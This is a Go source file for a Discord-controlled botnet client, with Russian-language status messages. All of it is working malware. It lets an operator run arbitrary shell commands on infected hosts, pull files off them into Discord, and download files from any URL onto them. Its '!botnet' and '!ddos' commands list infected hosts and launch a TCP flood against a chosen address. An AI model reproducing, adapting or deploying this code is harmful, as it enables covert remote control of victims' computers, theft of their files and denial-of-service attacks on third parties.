package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/bwmarrin/discordgo"
)

//go:embed token.txt
var Token string

var (
	Prefix   string = "!"
	hostname string
	Console  string
	IsDDos   bool = false
)

func main() {
	hostname, _ = os.Hostname()

	dg, err := discordgo.New("Bot " + strings.TrimSpace(Token))
	if err != nil {
		fmt.Printf("Error new bot")
		return
	}

	dg.AddHandler(messageCreate)

	dg.Identify.Intents = discordgo.IntentsAll

	err = dg.Open()
	if err != nil {
		return
	}

	for true {
	}
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	} else if m.ChannelID == Console {
		commands := strings.Split(m.Content, " ")

		if commands[0] == "exit" {
			s.ChannelDelete(Console)
			Console = ""
		} else if commands[0] == "cd" {
			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Введите путь до директории")
			} else {
				new_path := strings.Join(commands[1:], " ")
				err := os.Chdir(new_path)

				if err != nil {
					s.ChannelMessageSend(Console, fmt.Sprintf("При изменении директории возникла ошибка: %v", err))
				} else {
					s.ChannelMessageSend(Console, fmt.Sprintf("Директория измененна на **%v**", new_path))
				}
			}
		} else if commands[0] == "get" {
			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Укажите имя файла")
			} else {
				file, err := os.Open(strings.Join(commands[1:], " "))
				state, _ := file.Stat()

				if err != nil {
					s.ChannelMessageSend(Console, fmt.Sprintf("При открытии файла возникла ошибка: %v", err))
				} else if state.IsDir() {
					s.ChannelMessageSend(Console, fmt.Sprintf("**%v** является директорией", file.Name()))
				} else {
					s.ChannelFileSend(Console, file.Name(), file)
				}
			}
		} else if commands[0] == "download" {
			if len(m.Attachments) != 0 {
				for _, file := range m.Attachments {
					commands = append(commands, file.URL)
				}
			}

			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Введите ссылку на файл")
				return
			}

			for _, url := range commands[1:] {
				resp, err := http.Get(url)

				if err != nil {
					s.ChannelMessageSend(Console, fmt.Sprintf("При получении файла возникла ошибка: %v", err))
				} else {
					body, _ := ioutil.ReadAll(resp.Body)
					url_path := strings.Split(resp.Request.URL.Path, "/")

					file, err := os.Create(url_path[len(url_path)-1])
					if err != nil {
						s.ChannelMessageSend(Console, fmt.Sprintf("При создании файла возникла ошибка: %v", err))
					}

					file.Write(body)
					file.Close()
				}
			}
		} else if commands[0] == "dir" || commands[0] == "ls" {
			dir, _ := os.ReadDir(".")
			var output string

			for _, file := range dir {
				if file.IsDir() {
					output += file.Name() + "/" + "\n"
				} else {
					output += file.Name() + "\n"
				}
			}

			_, err := s.ChannelMessageSend(Console, "```"+output+"```")
			if err != nil {
				max_len_output_command(s, output)
			}
		} else if commands[0] == "whoami" {
			usr, _ := user.Current()
			s.ChannelMessageSend(Console, "```"+usr.Username+"```")
		} else if commands[0] == "mkdir" {
			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Укажите название папки")
				return
			}

			err := os.Mkdir(commands[1], 0777)

			if err != nil {
				s.ChannelMessageSend(Console, fmt.Sprintf("Во время создания папки произошла ошибка: %v", err))
			} else {
				s.ChannelMessageSend(Console, "Папка успешна создана")
			}
		} else if commands[0] == "rmdir" {
			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Укажите название папки")
				return
			}

			err := os.Remove(commands[1])

			if err != nil {
				s.ChannelMessageSend(Console, fmt.Sprintf("Во время удаления папки произошла ошибка: %v", err))
			} else {
				s.ChannelMessageSend(Console, "Папка успешна удалена")
			}
		} else if commands[0] == "cat" {
			if len(commands) == 1 {
				s.ChannelMessageSend(Console, "Укажите имя файла")
				return
			}

			output, _ := os.ReadFile(commands[1])
			_, err := s.ChannelMessageSend(Console, "```"+string(output)+"```")
			if err != nil {
				max_len_output_command(s, string(output))
			}
		} else if commands[0] == "pwd" {
			pwd, _ := filepath.Abs(".")
			s.ChannelMessageSend(Console, "```"+pwd+"```")
		} else {
			output, err := output_command(m.Content)
			var output_edit string

			if err != nil {
				output_edit = fmt.Sprintf("Команда выдала ошибку: %v", err)
			} else if len(output) == 0 {
				output_edit = "Команда успешна выполнена"
			} else {
				output_edit = fmt.Sprintf("```%v```", output)
			}

			_, err = s.ChannelMessageSend(Console, output_edit)
			if err != nil {
				max_len_output_command(s, output)
			}
		}

		return
	}

	if m.Content == fmt.Sprintf("%vbotnet", Prefix) {
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("**%v**", hostname))
	} else if m.Content == fmt.Sprintf("%v%v", Prefix, hostname) {
		if Console != "" {
			s.ChannelDelete(Console)
		}

		channel, err := s.GuildChannelCreate(m.GuildID, hostname, discordgo.ChannelTypeGuildText)
		if err != nil {
			channel, _ = s.GuildChannelCreate(m.GuildID, "console", discordgo.ChannelTypeGuildText)
		}

		Console = channel.ID

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("<#%v>", Console))
	} else if m.Content == fmt.Sprintf("%vstop-ddos", Prefix) {
		IsDDos = false
	} else if strings.HasPrefix(m.Content, fmt.Sprintf("%vddos", Prefix)) {
		addr := strings.Split(m.Content, " ")[1]
		IsDDos = true

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("**%v** начал атаковать **%s**", hostname, addr))

		for IsDDos {
			con, err := net.Dial("tcp", addr)
			if err != nil {
				break
			}

			_, err = con.Write([]byte("XD"))
			if err != nil {
				break
			}

			con.Close()
		}

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("**%v** закончил атаковать **%s**", hostname, addr))
	}
}

func output_command(cmd string) (string, error) {
	command_and_args := strings.Split(cmd, " ")
	command := command_and_args[0]
	args := command_and_args[1:]

	c, err := exec.Command(command, args...).Output()

	return string(c), err
}

func max_len_output_command(s *discordgo.Session, output string) {
	path_file := os.TempDir() + "/result.txt"

	fw, _ := os.Create(path_file)
	fw.WriteString(output)
	fw.Close()

	file, _ := os.Open(path_file)

	s.ChannelFileSend(Console, "result.txt", file)

	os.Remove(path_file)
}
